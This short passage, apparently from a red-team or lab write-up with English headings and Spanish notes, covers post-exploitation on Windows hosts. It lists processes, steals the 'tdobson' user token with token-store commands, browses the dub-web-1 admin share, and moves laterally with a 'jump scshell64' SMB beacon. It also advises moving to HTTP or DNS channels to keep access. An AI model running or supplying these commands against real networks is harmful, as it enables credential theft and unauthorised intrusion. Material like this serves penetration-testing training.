#### Post-Exploitation / Token Abuse

```powershell
ps
```

Active processes and potentially reusable tokens are identified.

```powershell
# Then steal the token:
token-store steal PID_EXPLORER_tdobson
token-store use 0
```

The `tdobson` user token is stolen, allowing operations under that security context.

#### Lateral Movement (SMB Beacon)

```powershell
ls \\dub-web-1\c$
jump scshell64 dub-web-1 smb
```

- Los beacons SMB son temporales
- No proporcionan persistencia
- Es necesario migrar a un canal estable (HTTP/DNS) para mantener acceso
